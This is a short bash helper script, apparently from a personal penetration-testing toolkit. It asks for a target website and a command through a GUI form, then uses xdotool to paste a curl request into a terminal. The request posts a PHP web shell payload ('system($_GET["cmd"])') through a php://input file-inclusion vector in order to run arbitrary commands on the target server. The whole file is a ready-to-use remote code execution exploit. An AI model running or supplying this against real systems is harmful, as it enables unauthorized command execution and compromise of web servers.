#!/bin/bash

: '
Try to execute a cmd with php://input
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Website" "Cmd"

WEBSITE=${form_data["Website"]}
CMD=${form_data["Cmd"]}

paste_command "curl -s -X POST --data '<?php system(\$_GET["cmd"]); ?>' "${WEBSITE}php://input\&cmd=${CMD}""
